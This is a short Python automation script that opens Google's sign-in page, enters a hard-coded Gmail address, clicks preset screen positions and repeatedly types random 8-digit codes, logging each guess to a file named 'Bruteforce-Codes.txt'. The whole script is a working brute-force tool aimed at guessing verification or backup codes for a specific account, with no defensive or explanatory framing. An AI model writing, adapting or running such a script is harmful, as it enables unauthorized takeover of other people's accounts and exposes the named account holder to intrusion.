import webbrowser
import time
import pyautogui
import pyperclip
import random
import os
import threading
import tkinter as tk


desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
file_path = os.path.join(desktop_path, "Bruteforce-Codes.txt")

stop_flag = False

def automation_loop():
    global stop_flag
    while not stop_flag:
        url = "https://accounts.google.com/signin"
        print("Start Browser")
        webbrowser.open(url)

        time.sleep(5)

        
        email = 'sumi.star500@gmail.com'
        pyperclip.copy(email)
        time.sleep(0.5)

        pyautogui.hotkey('ctrl', 'v')
        time.sleep(0.5)
        pyautogui.press('enter')

        time.sleep(5)

        
        click_positions = [
            (1253, 660),        # write your mouse settings here
            (1165, 626),
            (1082, 527),
            (1243, 669),
        ]

        for idx, (x, y) in enumerate(click_positions, start=1):
            if stop_flag:
                print("Stop detected.")
                return
            print(f"Klick {idx}: Position ({x}, {y})")
            pyautogui.moveTo(x, y, duration=0.5)
            time.sleep(0.2)
            pyautogui.click()
            time.sleep(2)

        
        random_number = ''.join(str(random.randint(0, 9)) for _ in range(8))
        print(f"Write random number: {random_number}")

       
        pyautogui.write(random_number)
        time.sleep(0.5)

        
        pyautogui.press('enter')
        time.sleep(0.5)

        
        with open(file_path, "a") as f:
            f.write(random_number + "\n")
            f.write("==========\n")

        print(f"Number saved to file: {file_path}")
        print("Done, restarting...\n")
        time.sleep(3)

def stop_script():
    global stop_flag
    stop_flag = True
    root.destroy()


root = tk.Tk()
root.title("Automation Control")
root.geometry("200x100")

stop_button = tk.Button(
    root,
    text="Stop Script",
    command=stop_script,
    fg="white",
    bg="Blue",
    font=("Arial", 14)
)
stop_button.pack(expand=True, fill='both')


threading.Thread(target=automation_loop, daemon=True).start()


root.mainloop()
print("Script finished!")
